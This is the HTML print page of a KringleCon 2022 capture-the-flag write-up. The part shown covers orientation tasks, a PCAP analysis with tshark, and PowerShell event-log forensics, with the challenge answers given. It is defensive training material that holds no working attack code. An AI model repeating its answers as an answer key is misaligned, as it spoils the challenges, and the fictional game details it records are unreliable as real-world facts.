@@ -1,0 +1,1782 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="img/favicon.ico" />
+    <title>Print Site - alt3kx KringleCon 2022 Write-Up</title>
+    <link rel="stylesheet" href="css/theme.css" />
+    <link rel="stylesheet" href="css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+        <link href="css/print-site-enum-headings2.css" rel="stylesheet" />
+        <link href="css/print-site-enum-headings3.css" rel="stylesheet" />
+        <link href="css/print-site-enum-headings4.css" rel="stylesheet" />
+        <link href="css/print-site-enum-headings5.css" rel="stylesheet" />
+        <link href="css/print-site-enum-headings6.css" rel="stylesheet" />
+        <link href="css/print-site.css" rel="stylesheet" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Print Site";
+        var mkdocs_page_input_path = "print_page.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <script src="js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+
+        <script type="text/javascript">
+        document.addEventListener('DOMContentLoaded', function () {
+            remove_material_navigation();remove_mkdocs_theme_navigation();generate_toc();
+        })
+        </script>
+        </head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="index.html" class="icon icon-home"> alt3kx KringleCon 2022 Write-Up
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="//search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="index.html">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">0. KringleCon Orientation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/0_KringleCon_Orientation/01_Talk_to_Jingle_Ringford.html">01. Talk to Jingle Ringford</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/0_KringleCon_Orientation/02_Get_your_badge.html">02. Get your badge</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/0_KringleCon_Orientation/03_Create_a_wallet.html">03. Create a wallet</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/0_KringleCon_Orientation/04_Use_the_terminal.html">04. Use the terminal</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/0_KringleCon_Orientation/05_Talk_to_Santa.html">05. Talk to Santa</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">1. Recover the Tolkien Ring</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/1_Recover_the_Tolkien_Ring/1.1_Wireshark_Practice.html">1.1 Wireshark Practice</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/1_Recover_the_Tolkien_Ring/1.2_Find_the_Next_Objective.html">1.2 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html">1.3 Windows Event Logs</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/1_Recover_the_Tolkien_Ring/1.4_Find_the_Next_Objective.html">1.4 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html">1.5 Suricata_Regatta</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">2. Recover the Elfen Ring</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html">2.1 Clone with a Diference</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/2_Recover_the_Elfen_Ring/2.2_Find_the_Next_Objective.html">2.2 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html">2.3 Prison Escape</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/2_Recover_the_Elfen_Ring/2.4_Find_the_Next_Objective.html">2.4 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html">2.5 Jolly CI/CD</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">3. Recover the Web Ring</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/3_Recover_the_Web_Ring/3.1_Naughty_IP.html">3.1 Naught IP</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/3_Recover_the_Web_Ring/3.2_Credential_Mining.html">3.2 Credential Mining</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/3_Recover_the_Web_Ring/3.3_404_FTW.html">3.3 404 FTW</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.html">3.4 IMDS XXE and Other Abbreviations</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/3_Recover_the_Web_Ring/3.5_Find_the_Next_Objective.html">3.5 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/3_Recover_the_Web_Ring/3.6_Open_Boria_Mine_Door.html">3.6 Open Boria Mine Door</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/3_Recover_the_Web_Ring/3.7_Find_the_Next_Objective.html">3.7 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/3_Recover_the_Web_Ring/3.8_Glamtariel_s_Fountain.html">3.8 Glamtariel's Fountain</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">4. Recover the Cloud Ring</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/4_Recover_the_Cloud_Ring/4.1_AWS_CLI_Intro.html">4.1 AWS CLI_Intro</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/4_Recover_the_Cloud_Ring/4.2_Find_the_Next_Objective.html">4.2 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/4_Recover_the_Cloud_Ring/4.3_Trufflehog_Search.html">4.3 Trufflehog Search</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/4_Recover_the_Cloud_Ring/4.4_Find_the_Next_Objective.html">4.4 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.html">4.5 Exploitation via AWS CLI</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">5. Recover the Burning Ring of Fire</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html">5.1 Buy a Hat</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/5_Recover_the_Burning_Ring_of_Fire/5.2_Blockchain_Divination.html">5.2 Blockchain Divination</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html">5.3 Exploit a Smart Contract</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">6. Finale</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="Objectives/6_Finale/6.1_Finale.html">6.1 Finale and Roll Credits</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="index.html">alt3kx KringleCon 2022 Write-Up</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="index.html" class="icon icon-home" alt="Docs"></a> &raquo;</li>
+      <li>Print Site</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <div id="print-site-page" class="">
+        <section class="print-page">
+            <div id="print-page-toc" data-toc-depth="6">
+                <nav role='navigation' class='print-page-toc-nav'>
+                <h1 class='print-page-toc-title'>Table of Contents</h1>
+                </nav>
+            </div>
+        </section>
+        <section class="print-page" id="index"><h1 id="index-kringlecon-2022-write-up">KringleCon 2022 Write-Up</h1>
+<p><img src="../Objectives/intro/kringleCoin.jpeg"></p>
+<h2 id="index-story">Story</h2>
+<p>Five Rings for the Christmas king immersed in cold</br>
+Each Ring now missing from its zone </br>
+The first with bread kindly given, not sold </br>
+Another to find 'ere pipelines get owned </br>
+One beneath a fountain where water flowed </br>
+Into clouds Grinchum had the fourth thrown </br>
+The fifth on blockchains where shadows be bold </br>
+One hunt to seek them all, five quests to find them </br>
+One player to bring them all, and Santa Claus to bind them </br></p>
+<h2 id="index-objectives">Objectives</h2>
+<ul>
+<li>
+<p><a href="#.">Objective 0: KringleCon Orientation</a></p>
+<ul>
+<li><a href="#objectives-0_kringlecon_orientation-01_talk_to_jingle_ringford">01. Talk to Jingle Ringford</a></li>
+<li><a href="#objectives-0_kringlecon_orientation-02_get_your_badge">02. Get your badge</a></li>
+<li><a href="#objectives-0_kringlecon_orientation-03_create_a_wallet">03. Create a wallet</a></li>
+<li><a href="#objectives-0_kringlecon_orientation-04_use_the_terminal">04. Use the terminal</a></li>
+<li><a href="#objectives-0_kringlecon_orientation-05_talk_to_santa">05. Talk to Santa</a></li>
+</ul>
+</li>
+<li>
+<p><a href="#.">Objective 1: Recover the Tolkien Ring</a></p>
+<ul>
+<li><a href="#objectives-1_recover_the_tolkien_ring-1.1_wireshark_practice">1.1 Wireshark Practice</a></li>
+<li><a href="#objectives-1_recover_the_tolkien_ring-1.2_find_the_next_objective">1.2 Find the Next Objective</a></li>
+<li><a href="#objectives-1_recover_the_tolkien_ring-1.3._windows_event_logs">1.3 Windows Event Logs</a></li>
+<li><a href="#objectives-1_recover_the_tolkien_ring-1.4_find_the_next_objective">1.4 Find the Next Objective</a></li>
+<li><a href="#objectives-1_recover_the_tolkien_ring-1.5_suricata_regatta">1.5 Suricata Regatta</a></li>
+</ul>
+</li>
+<li>
+<p><a href="#.">Objective 2: Recover the Elfen Ring</a></p>
+<ul>
+<li><a href="#objectives-2_recover_the_elfen_ring-2.1_clone_with_a_diference">2.1 Clone with a Diference</a></li>
+<li><a href="#objectives-2_recover_the_elfen_ring-2.2_find_the_next_objective">2.2 Find the Next Objective</a></li>
+<li><a href="#objectives-2_recover_the_elfen_ring-2.3_prison_escape">2.3 Prison Escape</a></li>
+<li><a href="#objectives-2_recover_the_elfen_ring-2.4_find_the_next_objective">2.4 Find the Next Objective</a></li>
+<li><a href="#objectives-2_recover_the_elfen_ring-2.5_jolly_ci_cd">2.5 Jolly CI/CD</a></li>
+</ul>
+</li>
+<li>
+<p><a href="#.">Objective 3: Recover the Web Ring</a></p>
+<ul>
+<li><a href="#objectives-3_recover_the_web_ring-3.1_naughty_ip">3.1 Naught IP</a></li>
+<li><a href="#objectives-3_recover_the_web_ring-3.2_credential_mining">3.2 Credential Mining</a></li>
+<li><a href="#objectives-3_recover_the_web_ring-3.3_404_ftw">3.3 404 FTW</a></li>
+<li><a href="#objectives-3_recover_the_web_ring-3.4_imds_xxe_and_other_abbreviations">3.4 IMDS XXE and Other Abbreviations</a></li>
+<li><a href="#objectives-3_recover_the_web_ring-3.5_find_the_next_objective">3.5 Find the Next Objective</a></li>
+<li><a href="#objectives-3_recover_the_web_ring-3.6_open_boria_mine_door">3.6 Open Boria Mine Door</a></li>
+<li><a href="#objectives-3_recover_the_web_ring-3.7_find_the_next_objective">3.7 Find the Next Objective</a></li>
+<li><a href="#objectives-3_recover_the_web_ring-3.8_glamtariel_s_fountain">3.8 Glamtariel's Fountain</a></li>
+</ul>
+</li>
+<li>
+<p><a href="#.">Objective 4: Recover the Cloud Ring</a></p>
+<ul>
+<li><a href="#objectives-4_recover_the_cloud_ring-4.1_aws_cli_intro">4.1 AWS CLI_Intro</a></li>
+<li><a href="#objectives-4_recover_the_cloud_ring-4.2_find_the_next_objective">4.2 Find the Next Objective</a></li>
+<li><a href="#objectives-4_recover_the_cloud_ring-4.3_trufflehog_search">4.3 Trufflehog Search</a></li>
+<li><a href="#objectives-4_recover_the_cloud_ring-4.4_find_the_next_objective">4.4 Find the Next Objective</a></li>
+<li><a href="#objectives-4_recover_the_cloud_ring-4.5_exploitation_via_aws_cli">4.5 Exploitation via AWS CLI</a></li>
+</ul>
+</li>
+<li>
+<p><a href="#.">Objective 5: Recover the Burning Ring of Fire</a></p>
+<ul>
+<li><a href="#objectives-5_recover_the_burning_ring_of_fire-5.1_buy_a_hat">5.1 Buy a Hat</a></li>
+<li><a href="#objectives-5_recover_the_burning_ring_of_fire-5.2_blockchain_divination">5.2 Blockchain Divination</a></li>
+<li><a href="#objectives-5_recover_the_burning_ring_of_fire-5.3_exploit_a_smart_contract">5.3 Exploit a Smart Contract</a></li>
+</ul>
+</li>
+<li>
+<p><a href="#.">Finale 6: Roll Creits</a></p>
+<ul>
+<li><a href="#objectives-6_finale-6.1_finale">6.1 Finale and Roll Credits</a></li>
+</ul>
+</li>
+</ul></section>
+                        <h1 class='nav-section-title' id='section-0-kringlecon-orientation'>
+                            0. KringleCon Orientation <a class='headerlink' href='#section-0-kringlecon-orientation' title='Permanent link'>↵</a>
+                        </h1>
+                        <section class="print-page" id="objectives-0_kringlecon_orientation-01_talk_to_jingle_ringford"><h1 id="objectives-0_kringlecon_orientation-01_talk_to_jingle_ringford-kringlecon-orientation">KringleCon Orientation</h1>
+<h2 id="objectives-0_kringlecon_orientation-01_talk_to_jingle_ringford-01-talk-to-jingle-ringford">0.1 Talk to Jingle Ringford</h2>
+<p><img src="Objectives/img/0.1_Talk_to_Jingle_Ringford.png"></p>
+<p>Talk to Jingle Ringford
+Jingle Ringford will start you on your journey!</p>
+<h2 id="objectives-0_kringlecon_orientation-01_talk_to_jingle_ringford-solve">Solve</h2>
+<p><img src="Objectives/img/0.1_Talk_to_Jingle_Ringford_solve.png"></p></section><section class="print-page" id="objectives-0_kringlecon_orientation-02_get_your_badge"><h1 id="objectives-0_kringlecon_orientation-02_get_your_badge-kringlecon-orientation">KringleCon Orientation</h1>
+<h2 id="objectives-0_kringlecon_orientation-02_get_your_badge-02-get-your-badge">0.2 Get your badge</h2>
+<p><img src="Objectives/img/0.2_Get_your_badge.png"></p>
+<h2 id="objectives-0_kringlecon_orientation-02_get_your_badge-solve">Solve</h2>
+<pre><code class="language-ruby">See the dialog with Jingle Ringford &quot;It's the five golden rings in the middle of your avatar.&quot; 
+</code></pre>
+<p><img src="Objectives/img/0.2_Get_your_badge_avatar.png"></p></section><section class="print-page" id="objectives-0_kringlecon_orientation-03_create_a_wallet"><h1 id="objectives-0_kringlecon_orientation-03_create_a_wallet-kringlecon-orientation">KringleCon Orientation</h1>
+<h2 id="objectives-0_kringlecon_orientation-03_create_a_wallet-03-create-a-wallet">0.3 Create a wallet</h2>
+<p><img src="Objectives/img/0.3_Create_a_wallet.png"></p>
+<p>Create a crypto wallet</p>
+<h2 id="objectives-0_kringlecon_orientation-03_create_a_wallet-solve">Solve</h2>
+<p><img src="Objectives/img/0.3_Create_a_wallet_solve_01.png"></p>
+<p><img src="Objectives/img/0.3_Create_a_wallet_solve_02.png"></p></section><section class="print-page" id="objectives-0_kringlecon_orientation-04_use_the_terminal"><h1 id="objectives-0_kringlecon_orientation-04_use_the_terminal-kringlecon-orientation">KringleCon Orientation</h1>
+<h2 id="objectives-0_kringlecon_orientation-04_use_the_terminal-04-use-the-terminal">0.4 Use the terminal</h2>
+<p><img src="Objectives/img/0.4_Use_the_terminal.png"></p>
+<h2 id="objectives-0_kringlecon_orientation-04_use_the_terminal-solve">Solve</h2>
+<h3 id="objectives-0_kringlecon_orientation-04_use_the_terminal-terminal-answers">Terminal answers</h3>
+<p>Welcome to the first terminal challenge: </p>
+<ul>
+<li>This one is intentionally simple. All we need you to do is: </li>
+<li>Type answer and prest Enter </li>
+</ul>
+<pre><code class="language-ruby">Solve: type on terninal &quot;answer&quot;
+</code></pre>
+<p><img src="Objectives/img/0.4_Use_the_terminal_answer.png"></p></section><section class="print-page" id="objectives-0_kringlecon_orientation-05_talk_to_santa"><h1 id="objectives-0_kringlecon_orientation-05_talk_to_santa-kringlecon-orientation">KringleCon Orientation</h1>
+<h2 id="objectives-0_kringlecon_orientation-05_talk_to_santa-05-talk-to-santa">0.5 Talk to Santa</h2>
+<p><img src="Objectives/img/0.5_Talk_to_Santa.png"></p>
+<p>Talk to Santa
+Talk to Santa in front of the castle to get your next objectives."</p>
+<h2 id="objectives-0_kringlecon_orientation-05_talk_to_santa-solve">Solve</h2>
+<p><img src="Objectives/img/0.5_Talk_to_Santa_solve.png"></p>
+<p><img src="Objectives/img/0.5_KringleCon_Orientation_completed.png"></p></section><h1 class='nav-section-title-end'>Ended: 0. KringleCon Orientation</h1>
+                        <h1 class='nav-section-title' id='section-1-recover-the-tolkien-ring'>
+                            1. Recover the Tolkien Ring <a class='headerlink' href='#section-1-recover-the-tolkien-ring' title='Permanent link'>↵</a>
+                        </h1>
+                        <section class="print-page" id="objectives-1_recover_the_tolkien_ring-1.1_wireshark_practice"><h1 id="objectives-1_recover_the_tolkien_ring-1.1_wireshark_practice-recover-the-tolkien-ring">Recover the Tolkien Ring</h1>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.1_wireshark_practice-11-wireshark-practice">1.1 Wireshark Practice</h2>
+<p><img src="Objectives/img/1.1_Wireshark_Practice.png"></p>
+<p>Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysteries around the suspicious PCAP. Get hints for this challenge by typing hint in the upper panel of the terminal.</p>
+<p><img src="Objectives/img/1.1_Sparkle_Redberry.png"></p>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.1_wireshark_practice-solve">Solve</h2>
+<p>Download the pcap file: https://storage.googleapis.com/hhc22_player_assets/suspicious.pcap</p>
+<h3 id="objectives-1_recover_the_tolkien_ring-1.1_wireshark_practice-terminal-answers">Terminal answers</h3>
+<p>Task: Analyze the Wireshark file and Answer the Elf's Questions!
+To complete your task, download the file from your badge or use this command line to answer the questions.
+Tips:
+1. Each question may have hints. If you want another hint from the elf, just type hint in the upper pane.
+2. If you need help with Wireshark filters you can go here: https://wiki.wireshark.org/DisplayFilters
+3. If you need help with tshark filters, try this cheat sheet: https://cheatography.com/mbwalker/cheat-sheets/tshark-wireshark-command-line/ 
+4. Of course, SANS has lots of cheat sheets that can help: https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/
+5. And remember, you can use Wireshark filters in tshark.</p>
+<p>Tmux orientation:
+For this terminal, you can use the mouse to switch or resize panes.
+For clipboard use, you can shift-click and drag, then Ctrl+c to copy.
+Use Ctrl+Shift+v to paste.
+Normal tmux shortcuts ( Ctrl+b+↑ or ↓ ) work as well.</p>
+<p>1.- There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exeported from this PCAP?</p>
+<pre><code class="language-ruby">ANSWER: http
+</code></pre>
+<p>Solve: Just read the links and hints and info provided </br>
+<strong>Hint 1</strong>: https://unit42.paloaltonetworks.com/using-wireshark-exporting-objects-from-a-pcap/</br>
+<strong>Hint 2</strong>: We're looking for a protocol like FTP, HTTP, SMB, etc.</br>
+<strong>Hint 3</strong>: https://osqa-ask.wireshark.org/questions/35846/how-can-i-export-http-objects-via-command-line/</br></p>
+<p>2.- What is the file name of the largest file we can export?</p>
+<pre><code class="language-ruby">ANSWER: app.php
+</code></pre>
+<p>Solve: Use tshark commandliner <code>$ tshark -r pcap_challenge.pcap --export-objects "http,http"</code></br>
+<strong>Hint 1</strong>: https://unit42.paloaltonetworks.com/using-wireshark-exporting-objects-from-a-pcap/</br>
+<strong>Hint 2</strong>: If working in the terminal, you may need to combine tshark commands with other Linux commands</br></p>
+<p>3.- What packet number starts the app.php file?</p>
+<pre><code class="language-ruby">ANSWER: 687
+</code></pre>
+<p>Solve:  Use wireshark:  <code>Export HTTP options -&gt; see the number of packets [../snip]</code></br>
+<strong>Hint 1</strong>: In Wireshark, the Export | HTTP object list shows start packet numbers</br>
+<strong>Hint 2</strong>: When using tshark look for (text/html) in the output</br></p>
+<p>4.- What is the IP pf the Apache Server?</p>
+<pre><code class="language-ruby">ANSWER: 192.185.57.242
+</code></pre>
+<p>Solve: <code>Just use wireshark to visualize the IP address with Apache Server</code></br>
+<strong>Hint 1</strong>: Search for 'apache' with Wireshark's Find function</br>
+<strong>Hint 2</strong>: Remember Linux is case-sensitive</br>
+<strong>Hint 3</strong>: Try using http.request and http.host </br></p>
+<p>5.- What file is saved to the infected hosts?</p>
+<pre><code class="language-ruby">ANSWER: Ref_Sept24-2020.zip
+</code></pre>
+<p>Solve: <code>See inside app(1).php, data is encoded</code> </br>
+<strong>Hint 1</strong>: Look inside the first TCP stream </br>
+<strong>Hint 2</strong>: The answer is a .zip file </br>
+<strong>Hint 3</strong>: Look inside the files that you exported using tshark </br>
+<strong>Hint 4</strong>: https://unit42.paloaltonetworks.com/wireshark-tutorial-dridex-infection-traffic/ </br></p>
+<p>6.- Attackers used bad TLS certificates in this traffict. Which countries were thet registered to6? Submit the names of the countries in alphabetical order separated by a commas Ex: Norway, South Korea).</p>
+<pre><code class="language-ruby">ANSWER: Ireland, Israel, South Sudan , United States
+</code></pre>
+<p>Solve: Use tshark commandliner <code>$ tshark -r suspicious.pcap -Y "ssl.handshake.type == 11"</code> &lt;- or better using wireshark and see the options on Certificate Section: </br>
+<strong>Hint 1</strong>: Look up the country code </br>
+<strong>Hint 2</strong>: Look for cookies in https </br>
+<strong>Hint 3</strong>: Filter for tls handshake for certificate, https://subscription.packtpub.com/book/networking-and-servers/9781785887819/4/ch04lvl1sec27/the-ssl-tls-handshake </br>
+<strong>Hint 4</strong>: When using tshark, pipe results to grep, awk, sort, or any other tools that can help filter through the data</br></p>
+<pre><code class="language-ruby">SS (South Sudan), US (United States), IL (Israel), IE (Ireland)
+</code></pre>
+<p><img src="Objectives/img/6_answer.png"> </br></p>
+<p>7.- Is the host infected? </p>
+<pre><code class="language-ruby">ANSWER: yes
+</code></pre>
+<p><img src="Objectives/img/1.1_Wireshark_Practice_completed.png"></p></section><section class="print-page" id="objectives-1_recover_the_tolkien_ring-1.2_find_the_next_objective"><h1 id="objectives-1_recover_the_tolkien_ring-1.2_find_the_next_objective-recover-the-tolkien-ring">Recover the Tolkien Ring</h1>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.2_find_the_next_objective-12-find-the-next-objective">1.2 Find the Next Objective</h2>
+<p><img src="Objectives/img/1.2_Find_the_Next_Objective.png"></p>
+<p>Talk to <strong>Dusty Giftwrap</strong> for the next objective..</p>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.2_find_the_next_objective-solve">Solve</h2>
+<p><img src="Objectives/img/1.2_Dusty_Giftwrap.png"></p></section><section class="print-page" id="objectives-1_recover_the_tolkien_ring-1.3._windows_event_logs"><h1 id="objectives-1_recover_the_tolkien_ring-1.3._windows_event_logs-recover-the-tolkien-ring">Recover the Tolkien Ring</h1>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.3._windows_event_logs-13-windows-event-logs">1.3 Windows Event Logs</h2>
+<p><img src="Objectives/img/1.3_Windows_Event_Logs.png"></p>
+<p>Investigate the Windows event log mystery in the terminal or offline. Get hints for this challenge by typing hint in the upper panel of the Windows Event Logs terminal.</p>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.3._windows_event_logs-hints">Hint(s)</h2>
+<p><img src="Objectives/img/1.3_hint1.png"></p>
+<p><img src="Objectives/img/1.3_hint2.png"></p>
+<h2 id="objectives-1_recover_the_tolkien_ring-1.3._windows_event_logs-solve">Solve</h2>
+<p>Download the Windows event log file: https://storage.googleapis.com/hhc22_player_assets/powershell.evtx</p>
+<h3 id="objectives-1_recover_the_tolkien_ring-1.3._windows_event_logs-terminal-answers">Terminal answers</h3>
+<p>Grinchum sucessfully download his keylogger and has gathered the admin credentials !
+We think he used Powershell to find the Lembanh recipe and steal our secret ingredient. 
+Luckily, we enabled Pwoershell audiing adn have exported the windows Powershell logs to a flat text file. </p>
+<p>1.- What month/day/year did the attack take place ? for example 09/05/2021</p>
+<p><strong>HINT1</strong>: This is data that appers a lot into the log </br>
+<strong>HINT2</strong>: Sort and unique are great commands </br>
+<strong>HINT3</strong>: Find the dates that have the highest count.</br></p>
+<pre><code class="language-ruby">ANSWER: 12/24/2022
+</code></pre>
+<p>Solve:</p>
+<pre><code class="language-ruby">Use Forensic tool on Windows and se the correct date (in reverse-chronological order) 
+c:\&gt; EvtxECmd.exe -f powershell.evtx --csv C:\Tools\arsena_forensics\EvtxECmd\output\powershell.csv
+</code></pre>
+<p>2.- An attacker got a secret from a file. What was the original files's name ? </p>
+<p><strong>HINT1</strong>: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-7.3 </br></p>
+<pre><code class="language-ruby">ANSWER: recipe_updated.txt
+</code></pre>
+<p>Solve:</p>
+<pre><code class="language-ruby">$ cat powershell.csv| grep &quot;Add-Content -Path&quot;, se the file &quot;recipe_updated.txt&quot; 
+</code></pre>
+<p><img src="Objectives/img/1.3_2_answer.png">
+3.- The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions.</p>
+<p><strong>HINT1</strong>: The desire line in the file will start with a $ snce the question specifies a PowerShell variable (ex- $var)).</br>
+<strong>HINT2</strong>: To narrow your search look at https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-7.3 </br>
+<strong>HINT3</strong>: Windows logs are in reverse-chronological order, try reversing their order with tac. </br></p>
+<pre><code class="language-ruby">ANSWER:  $foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'
+</code></pre>
+<p>Solve: <code>Keep looking the cvs file log the line should without ScriptBlock</code></p>
+<p><img src="Objectives/img/1.3_3_answer.png"></p>
+<p>4.- After storing the altered file contents info the variable, the attacker used the variable to run separated command that wrote the modified data to a file. This was done multiple times. Submit the last full Powershell line that performed only this actions </p>
+<p><strong>HINT1</strong>: Loog the lines that start with $foo </br>
+<strong>HINT2</strong>: Windows logs are in reverse-chronological order, try reversing their order with tac. </br>
+<strong>HINT3</strong>: Read the question careful, and try grepping for the answer of question 2 </br></p>
+<pre><code class="language-ruby">ANSWER: $foo | Add-Content -Path 'Recipe'
+</code></pre>
+<p>Solve: </p>
+<pre><code class="language-ruby">Filter using grep and observe the reverse-chronological order
+$ cat powershell.csv| grep &quot;Add-Content -Path&quot; | grep ScriptBlockText: 
+</code></pre>
+<p><img src="Objectives/img/1.3_4_answer.png"></p>
+<p>5.- The attack ran the previous command against a file multiple times , What is the name of this file? </p>
+<pre><code class="language-ruby">ANSWER: Recipe.txt
+</code></pre>
+<p>Solve: </p>
+<pre><code class="language-ruby">Filter using grep and observe the reverse-chronological order
+$ cat powershell.csv| grep &quot;Add-Content -Path&quot; | grep ScriptBlockText: 
+</code></pre>
+<p>6.- Where any files deleted ? </p>
+<pre><code class="language-ruby">ANSWER: Yes 
+</code></pre>
+<p>7.- Was the original file (from the question 2) deleted ? </p>
+<pre><code class="language-ruby">ANSWER: No 
+</code></pre>
+<p>8.- What is the Event ID of the log that shows the actual command line used to delete the file? </p>
+<pre><code class="language-ruby">ANSWER: 4104
+</code></pre>
+<p>Solve: </p>
+<pre><code class="language-ruby">Filter using grep and observe the first line 4104 is the envent requestedd 
+$ cat powershell.csv| grep &quot;Add-Content -Path&quot; | grep ScriptBlockText: 
+See the Line: 
+$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt
+EventID: 4104
+</code></pre>
+<p>9.- Is the secret ingredient compromised ? </p>
+<pre><code class="language-ruby">ANSWER: Yes 
+</code></pre>
+<p>10.- What is the secret ingredient ? </p>
+<pre><code class="language-ruby">ANSWER: honey
+</code></pre>
+<p>Solve: </p>
+<pre><code class="language-ruby">Filter using grep and observe the first line 4104 is the envent requested
+$ cat powershell.csv| grep &quot;Add-Content -Path&quot; | grep ScriptBlockText: 
+See the line Line
+$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'
+</code></pre>
